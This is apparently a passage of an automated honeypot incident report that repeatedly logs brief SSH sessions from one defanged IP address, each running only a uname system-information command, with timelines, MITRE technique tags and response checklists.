|---|---|
| **Source IP** | `152.233.20[.]205` |
| **First Seen** | 2026-06-03 11:56 |
| **Last Seen** | 2026-06-03 11:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 11:56:09` | `cowrie.session.connect` |
| `2026-06-03 11:56:09` | `cowrie.client.version` |
| `2026-06-03 11:56:09` | `cowrie.client.kex` |
| `2026-06-03 11:56:10` | `cowrie.login.success` |
| `2026-06-03 11:56:11` | `cowrie.session.params` |
| `2026-06-03 11:56:11` | `cowrie.command.input` |
| `2026-06-03 11:56:11` | `cowrie.log.closed` |
| `2026-06-03 11:56:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.233.20[.]205` to AbuseIPDB if not already reported
- [ ] Block `152.233.20[.]205` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b3912d653286

| Field | Detail |
|---|---|
| **Source IP** | `152.233.20[.]205` |
| **First Seen** | 2026-06-03 11:56 |
| **Last Seen** | 2026-06-03 11:56 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 11:56:44` | `cowrie.session.connect` |
| `2026-06-03 11:56:44` | `cowrie.client.version` |
| `2026-06-03 11:56:45` | `cowrie.client.kex` |
| `2026-06-03 11:56:46` | `cowrie.login.success` |
| `2026-06-03 11:56:46` | `cowrie.session.params` |
| `2026-06-03 11:56:46` | `cowrie.command.input` |
| `2026-06-03 11:56:47` | `cowrie.log.closed` |
| `2026-06-03 11:56:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.233.20[.]205` to AbuseIPDB if not already reported
- [ ] Block `152.233.20[.]205` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-53d500bbbc09

| Field | Detail |
|---|---|
| **Source IP** | `152.233.20[.]205` |
| **First Seen** | 2026-06-03 11:56 |
| **Last Seen** | 2026-06-03 11:56 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 11:56:50` | `cowrie.session.connect` |
| `2026-06-03 11:56:50` | `cowrie.client.version` |
| `2026-06-03 11:56:50` | `cowrie.client.kex` |
| `2026-06-03 11:56:52` | `cowrie.login.success` |
| `2026-06-03 11:56:52` | `cowrie.session.params` |
| `2026-06-03 11:56:52` | `cowrie.command.input` |
| `2026-06-03 11:56:52` | `cowrie.log.closed` |
| `2026-06-03 11:56:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.233.20[.]205` to AbuseIPDB if not already reported
- [ ] Block `152.233.20[.]205` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4478f890df85

| Field | Detail |
|---|---|
| **Source IP** | `152.233.20[.]205` |
| **First Seen** | 2026-06-03 11:57 |
| **Last Seen** | 2026-06-03 11:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 11:57:48` | `cowrie.session.connect` |
| `2026-06-03 11:57:48` | `cowrie.client.version` |
| `2026-06-03 11:57:48` | `cowrie.client.kex` |
| `2026-06-03 11:57:49` | `cowrie.login.success` |
| `2026-06-03 11:57:49` | `cowrie.session.params` |
| `2026-06-03 11:57:49` | `cowrie.command.input` |
| `2026-06-03 11:57:50` | `cowrie.log.closed` |
| `2026-06-03 11:57:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.233.20[.]205` to AbuseIPDB if not already reported
- [ ] Block `152.233.20[.]205` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a5a9138add69

| Field | Detail |
|---|---|
| **Source IP** | `152.233.20[.]205` |
| **First Seen** | 2026-06-03 11:57 |
| **Last Seen** | 2026-06-03 11:57 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 11:57:54` | `cowrie.session.connect` |
| `2026-06-03 11:57:54` | `cowrie.client.version` |
| `2026-06-03 11:57:54` | `cowrie.client.kex` |
| `2026-06-03 11:57:55` | `cowrie.login.success` |
| `2026-06-03 11:57:56` | `cowrie.session.params` |
| `2026-06-03 11:57:56` | `cowrie.command.input` |
| `2026-06-03 11:57:56` | `cowrie.log.closed` |
| `2026-06-03 11:57:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.233.20[.]205` to AbuseIPDB if not already reported
- [ ] Block `152.233.20[.]205` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9c7e3fa2daa8

| Field | Detail |
|---|---|
| **Source IP** | `152.233.20[.]205` |
| **First Seen** | 2026-06-03 11:58 |
| **Last Seen** | 2026-06-03 11:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 11:58:00` | `cowrie.session.connect` |
| `2026-06-03 11:58:00` | `cowrie.client.version` |
| `2026-06-03 11:58:00` | `cowrie.client.kex` |
| `2026-06-03 11:58:00` | `cowrie.login.success` |
| `2026-06-03 11:58:01` | `cowrie.session.params` |
| `2026-06-03 11:58:01` | `cowrie.command.input` |
| `2026-06-03 11:58:01` | `cowrie.log.closed` |
| `2026-06-03 11:58:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.233.20[.]205` to AbuseIPDB if not already reported
- [ ] Block `152.233.20[.]205` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-21bf0d884fdb

| Field | Detail |
|---|---|
| **Source IP** | `152.233.20[.]205` |
| **First Seen** | 2026-06-03 11:58 |
| **Last Seen** | 2026-06-03 11:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 11:58:05` | `cowrie.session.connect` |
| `2026-06-03 11:58:05` | `cowrie.client.version` |
| `2026-06-03 11:58:05` | `cowrie.client.kex` |
| `2026-06-03 11:58:06` | `cowrie.login.success` |
| `2026-06-03 11:58:07` | `cowrie.session.params` |
| `2026-06-03 11:58:07` | `cowrie.command.input` |
| `2026-06-03 11:58:07` | `cowrie.log.closed` |
| `2026-06-03 11:58:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.233.20[.]205` to AbuseIPDB if not already reported
- [ ] Block `152.233.20[.]205` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bf47d8b190cd

| Field | Detail |
|---|---|
| **Source IP** | `152.233.20[.]205` |
| **First Seen** | 2026-06-03 11:58 |
| **Last Seen** | 2026-06-03 11:58 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 11:58:57` | `cowrie.session.connect` |
| `2026-06-03 11:58:57` | `cowrie.client.version` |
| `2026-06-03 11:58:57` | `cowrie.client.kex` |
| `2026-06-03 11:58:59` | `cowrie.login.success` |
| `2026-06-03 11:58:59` | `cowrie.session.params` |
| `2026-06-03 11:58:59` | `cowrie.command.input` |
| `2026-06-03 11:58:59` | `cowrie.log.closed` |
| `2026-06-03 11:58:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.233.20[.]205` to AbuseIPDB if not already reported
- [ ] Block `152.233.20[.]205` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-150d187d9481

| Field | Detail |
|---|---|
| **Source IP** | `152.233.20[.]205` |
| **First Seen** | 2026-06-03 11:59 |
| **Last Seen** | 2026-06-03 11:59 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 11:59:03` | `cowrie.session.connect` |
| `2026-06-03 11:59:03` | `cowrie.client.version` |
| `2026-06-03 11:59:03` | `cowrie.client.kex` |
| `2026-06-03 11:59:05` | `cowrie.login.success` |
| `2026-06-03 11:59:05` | `cowrie.session.params` |
| `2026-06-03 11:59:05` | `cowrie.command.input` |
| `2026-06-03 11:59:05` | `cowrie.log.closed` |
| `2026-06-03 11:59:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.233.20[.]205` to AbuseIPDB if not already reported
- [ ] Block `152.233.20[.]205` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0c128da8a3da

| Field | Detail |
|---|---|
| **Source IP** | `152.233.20[.]205` |
| **First Seen** | 2026-06-03 11:59 |
| **Last Seen** | 2026-06-03 11:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 11:59:09` | `cowrie.session.connect` |
| `2026-06-03 11:59:09` | `cowrie.client.version` |
| `2026-06-03 11:59:09` | `cowrie.client.kex` |
| `2026-06-03 11:59:10` | `cowrie.login.success` |
| `2026-06-03 11:59:10` | `cowrie.session.params` |
| `2026-06-03 11:59:10` | `cowrie.command.input` |
| `2026-06-03 11:59:11` | `cowrie.log.closed` |
| `2026-06-03 11:59:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.233.20[.]205` to AbuseIPDB if not already reported
- [ ] Block `152.233.20[.]205` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3327d5545ca3

| Field | Detail |
|---|---|
| **Source IP** | `152.233.20[.]205` |
| **First Seen** | 2026-06-03 11:59 |
| **Last Seen** | 2026-06-03 11:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 11:59:37` | `cowrie.session.connect` |
| `2026-06-03 11:59:37` | `cowrie.client.version` |
| `2026-06-03 11:59:38` | `cowrie.client.kex` |
| `2026-06-03 11:59:38` | `cowrie.login.success` |
| `2026-06-03 11:59:39` | `cowrie.session.params` |
| `2026-06-03 11:59:39` | `cowrie.command.input` |
| `2026-06-03 11:59:39` | `cowrie.log.closed` |
| `2026-06-03 11:59:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.233.20[.]205` to AbuseIPDB if not already reported
- [ ] Block `152.233.20[.]205` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a02cdecbea27

| Field | Detail |
|---|---|
| **Source IP** | `152.233.20[.]205` |
| **First Seen** | 2026-06-03 12:00 |
| **Last Seen** | 2026-06-03 12:00 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 12:00:12` | `cowrie.session.connect` |
| `2026-06-03 12:00:12` | `cowrie.client.version` |
| `2026-06-03 12:00:12` | `cowrie.client.kex` |
| `2026-06-03 12:00:13` | `cowrie.login.success` |
| `2026-06-03 12:00:14` | `cowrie.session.params` |
| `2026-06-03 12:00:14` | `cowrie.command.input` |
| `2026-06-03 12:00:14` | `cowrie.log.closed` |
| `2026-06-03 12:00:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.233.20[.]205` to AbuseIPDB if not already reported
- [ ] Block `152.233.20[.]205` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7243a5376126

| Field | Detail |
|---|---|
| **Source IP** | `152.233.20[.]205` |
| **First Seen** | 2026-06-03 12:00 |
| **Last Seen** | 2026-06-03 12:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 12:00:18` | `cowrie.session.connect` |
| `2026-06-03 12:00:18` | `cowrie.client.version` |
| `2026-06-03 12:00:18` | `cowrie.client.kex` |
| `2026-06-03 12:00:19` | `cowrie.login.success` |
| `2026-06-03 12:00:19` | `cowrie.session.params` |
| `2026-06-03 12:00:19` | `cowrie.command.input` |
| `2026-06-03 12:00:20` | `cowrie.log.closed` |
| `2026-06-03 12:00:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.233.20[.]205` to AbuseIPDB if not already reported
- [ ] Block `152.233.20[.]205` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b58a98b785c3

| Field | Detail |
|---|---|
| **Source IP** | `152.233.20[.]205` |
| **First Seen** | 2026-06-03 12:00 |
| **Last Seen** | 2026-06-03 12:00 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 12:00:24` | `cowrie.session.connect` |
| `2026-06-03 12:00:24` | `cowrie.client.version` |
| `2026-06-03 12:00:24` | `cowrie.client.kex` |
| `2026-06-03 12:00:25` | `cowrie.login.success` |
| `2026-06-03 12:00:25` | `cowrie.session.params` |
| `2026-06-03 12:00:25` | `cowrie.command.input` |
| `2026-06-03 12:00:26` | `cowrie.log.closed` |
| `2026-06-03 12:00:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.233.20[.]205` to AbuseIPDB if not already reported
- [ ] Block `152.233.20[.]205` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-57f11180ab7d

| Field | Detail |
|---|---|
| **Source IP** | `152.233.20[.]205` |
| **First Seen** | 2026-06-03 12:01 |
| **Last Seen** | 2026-06-03 12:01 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 12:01:15` | `cowrie.session.connect` |
| `2026-06-03 12:01:15` | `cowrie.client.version` |
| `2026-06-03 12:01:15` | `cowrie.client.kex` |
| `2026-06-03 12:01:17` | `cowrie.login.success` |
| `2026-06-03 12:01:17` | `cowrie.session.params` |
| `2026-06-03 12:01:17` | `cowrie.command.input` |
| `2026-06-03 12:01:17` | `cowrie.log.closed` |
| `2026-06-03 12:01:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.233.20[.]205` to AbuseIPDB if not already reported
- [ ] Block `152.233.20[.]205` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e220c5857a42

| Field | Detail |
|---|---|
| **Source IP** | `152.233.20[.]205` |
| **First Seen** | 2026-06-03 12:01 |
| **Last Seen** | 2026-06-03 12:01 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 12:01:33` | `cowrie.session.connect` |
| `2026-06-03 12:01:33` | `cowrie.client.version` |
| `2026-06-03 12:01:33` | `cowrie.client.kex` |
| `2026-06-03 12:01:34` | `cowrie.login.success` |
| `2026-06-03 12:01:35` | `cowrie.session.params` |
| `2026-06-03 12:01:35` | `cowrie.command.input` |
| `2026-06-03 12:01:35` | `cowrie.log.closed` |
| `2026-06-03 12:01:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.233.20[.]205` to AbuseIPDB if not already reported
- [ ] Block `152.233.20[.]205` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-548dddc2ad8a

| Field | Detail |
|---|---|
| **Source IP** | `152.233.20[.]205` |
| **First Seen** | 2026-06-03 12:01 |
| **Last Seen** | 2026-06-03 12:01 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 12:01:39` | `cowrie.session.connect` |
| `2026-06-03 12:01:39` | `cowrie.client.version` |
| `2026-06-03 12:01:39` | `cowrie.client.kex` |
| `2026-06-03 12:01:40` | `cowrie.login.success` |
| `2026-06-03 12:01:41` | `cowrie.session.params` |
| `2026-06-03 12:01:41` | `cowrie.command.input` |
| `2026-06-03 12:01:41` | `cowrie.log.closed` |
| `2026-06-03 12:01:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.233.20[.]205` to AbuseIPDB if not already reported
- [ ] Block `152.233.20[.]205` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1c2b620688b0

| Field | Detail |
|---|---|
| **Source IP** | `152.233.20[.]205` |
| **First Seen** | 2026-06-03 12:02 |
| **Last Seen** | 2026-06-03 12:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 12:02:01` | `cowrie.session.connect` |
| `2026-06-03 12:02:01` | `cowrie.client.version` |
| `2026-06-03 12:02:02` | `cowrie.client.kex` |
| `2026-06-03 12:02:03` | `cowrie.login.success` |
| `2026-06-03 12:02:03` | `cowrie.session.params` |
| `2026-06-03 12:02:03` | `cowrie.command.input` |
| `2026-06-03 12:02:03` | `cowrie.log.closed` |
| `2026-06-03 12:02:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.233.20[.]205` to AbuseIPDB if not already reported
- [ ] Block `152.233.20[.]205` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7a0da514ecd3

| Field | Detail |
|---|---|
| **Source IP** | `152.233.20[.]205` |
| **First Seen** | 2026-06-03 12:03 |
| **Last Seen** | 2026-06-03 12:03 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 12:03:11` | `cowrie.session.connect` |
| `2026-06-03 12:03:11` | `cowrie.client.version` |
| `2026-06-03 12:03:11` | `cowrie.client.kex` |
| `2026-06-03 12:03:12` | `cowrie.login.success` |
| `2026-06-03 12:03:13` | `cowrie.session.params` |
| `2026-06-03 12:03:13` | `cowrie.command.input` |
| `2026-06-03 12:03:13` | `cowrie.log.closed` |
| `2026-06-03 12:03:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.233.20[.]205` to AbuseIPDB if not already reported
- [ ] Block `152.233.20[.]205` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-04c7b1705908

| Field | Detail |
|---|---|
| **Source IP** | `152.233.20[.]205` |
| **First Seen** | 2026-06-03 12:03 |
| **Last Seen** | 2026-06-03 12:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 12:03:17` | `cowrie.session.connect` |
| `2026-06-03 12:03:17` | `cowrie.client.version` |
| `2026-06-03 12:03:17` | `cowrie.client.kex` |
| `2026-06-03 12:03:18` | `cowrie.login.success` |
| `2026-06-03 12:03:18` | `cowrie.session.params` |
| `2026-06-03 12:03:18` | `cowrie.command.input` |
| `2026-06-03 12:03:18` | `cowrie.log.closed` |
| `2026-06-03 12:03:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.233.20[.]205` to AbuseIPDB if not already reported
- [ ] Block `152.233.20[.]205` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c4cf27bc3f21

| Field | Detail |
|---|---|
| **Source IP** | `152.233.20[.]205` |
| **First Seen** | 2026-06-03 12:03 |
| **Last Seen** | 2026-06-03 12:03 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 12:03:52` | `cowrie.session.connect` |
| `2026-06-03 12:03:52` | `cowrie.client.version` |
| `2026-06-03 12:03:52` | `cowrie.client.kex` |
| `2026-06-03 12:03:53` | `cowrie.login.success` |
| `2026-06-03 12:03:53` | `cowrie.session.params` |
| `2026-06-03 12:03:53` | `cowrie.command.input` |
| `2026-06-03 12:03:54` | `cowrie.log.closed` |
| `2026-06-03 12:03:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.233.20[.]205` to AbuseIPDB if not already reported
- [ ] Block `152.233.20[.]205` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d924d1ef1fb1

| Field | Detail |
|---|---|
| **Source IP** | `152.233.20[.]205` |
| **First Seen** | 2026-06-03 12:04 |
| **Last Seen** | 2026-06-03 12:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 12:04:44` | `cowrie.session.connect` |
| `2026-06-03 12:04:44` | `cowrie.client.version` |
| `2026-06-03 12:04:44` | `cowrie.client.kex` |
| `2026-06-03 12:04:44` | `cowrie.login.success` |
| `2026-06-03 12:04:45` | `cowrie.session.params` |
| `2026-06-03 12:04:45` | `cowrie.command.input` |
| `2026-06-03 12:04:45` | `cowrie.log.closed` |
| `2026-06-03 12:04:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.233.20[.]205` to AbuseIPDB if not already reported
- [ ] Block `152.233.20[.]205` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e818406f3129

| Field | Detail |
|---|---|
| **Source IP** | `152.233.20[.]205` |
| **First Seen** | 2026-06-03 12:04 |
| **Last Seen** | 2026-06-03 12:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 12:04:49` | `cowrie.session.connect` |
| `2026-06-03 12:04:49` | `cowrie.client.version` |
| `2026-06-03 12:04:49` | `cowrie.client.kex` |
| `2026-06-03 12:04:50` | `cowrie.login.success` |
| `2026-06-03 12:04:51` | `cowrie.session.params` |
| `2026-06-03 12:04:51` | `cowrie.command.input` |
| `2026-06-03 12:04:51` | `cowrie.log.closed` |
| `2026-06-03 12:04:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.233.20[.]205` to AbuseIPDB if not already reported
- [ ] Block `152.233.20[.]205` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d4e8edfd7982

| Field | Detail |
|---|---|
| **Source IP** | `152.233.20[.]205` |
| **First Seen** | 2026-06-03 12:05 |
| **Last Seen** | 2026-06-03 12:05 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 12:05:30` | `cowrie.session.connect` |
| `2026-06-03 12:05:30` | `cowrie.client.version` |
| `2026-06-03 12:05:30` | `cowrie.client.kex` |
| `2026-06-03 12:05:31` | `cowrie.login.success` |
| `2026-06-03 12:05:32` | `cowrie.session.params` |
| `2026-06-03 12:05:32` | `cowrie.command.input` |
| `2026-06-03 12:05:32` | `cowrie.log.closed` |
| `2026-06-03 12:05:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.233.20[.]205` to AbuseIPDB if not already reported
- [ ] Block `152.233.20[.]205` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5f86f9c2567a

| Field | Detail |
|---|---|
| **Source IP** | `152.233.20[.]205` |
| **First Seen** | 2026-06-03 12:05 |
| **Last Seen** | 2026-06-03 12:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 12:05:47` | `cowrie.session.connect` |
| `2026-06-03 12:05:47` | `cowrie.client.version` |
| `2026-06-03 12:05:48` | `cowrie.client.kex` |
| `2026-06-03 12:05:48` | `cowrie.login.success` |
| `2026-06-03 12:05:49` | `cowrie.session.params` |
| `2026-06-03 12:05:49` | `cowrie.command.input` |
| `2026-06-03 12:05:49` | `cowrie.log.closed` |
| `2026-06-03 12:05:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.233.20[.]205` to AbuseIPDB if not already reported
- [ ] Block `152.233.20[.]205` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-43bb671815ce

| Field | Detail |
|---|---|
| **Source IP** | `152.233.20[.]205` |
| **First Seen** | 2026-06-03 12:05 |
| **Last Seen** | 2026-06-03 12:05 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 12:05:53` | `cowrie.session.connect` |
| `2026-06-03 12:05:53` | `cowrie.client.version` |
| `2026-06-03 12:05:53` | `cowrie.client.kex` |
| `2026-06-03 12:05:55` | `cowrie.login.success` |
| `2026-06-03 12:05:55` | `cowrie.session.params` |
| `2026-06-03 12:05:55` | `cowrie.command.input` |
